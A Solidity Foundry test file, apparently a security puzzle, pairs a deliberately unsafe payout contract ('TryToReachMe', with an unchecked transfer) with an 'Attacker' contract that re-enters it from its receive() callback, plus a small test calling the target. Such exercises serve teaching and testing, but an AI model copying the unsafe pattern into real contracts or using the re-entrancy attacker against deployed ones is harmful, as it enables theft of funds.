// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;
import "forge-std/Test.sol";


contract TryToReachMe {
    constructor() payable {
        assert(msg.value == 1 wei);
    }

    function tryMeBabe(address addr) public payable {
        uint256 balance = address(this).balance;
        console.log("balance: %s", balance);
        console.log("msg.value: %s", msg.value);
        if (msg.value > balance) {
            unchecked {
                payable(addr).transfer(balance + msg.value);
            }
        }
    }
}

contract Attacker {
    TryToReachMe immutable target;
    uint private attackAmount;

    constructor(address target_) payable {
        target = TryToReachMe(target_);
    }

    function attackBabe(uint amount) payable public {
        attackAmount = amount;
        target.tryMeBabe{value: amount}(address(this));
    }

    receive() external payable {
        if (attackAmount > 0) {
            target.tryMeBabe{value: attackAmount}(address(this));
            attackAmount = 0;
        }
    }
}

contract Test37 is Test {

    function test_pcav() external {
        deal(address(this), 1000e18);
        TryToReachMe tryToReachMe = new TryToReachMe{value: 1 wei}();
        tryToReachMe.tryMeBabe{value: 2 wei}(address(this));
    }
}
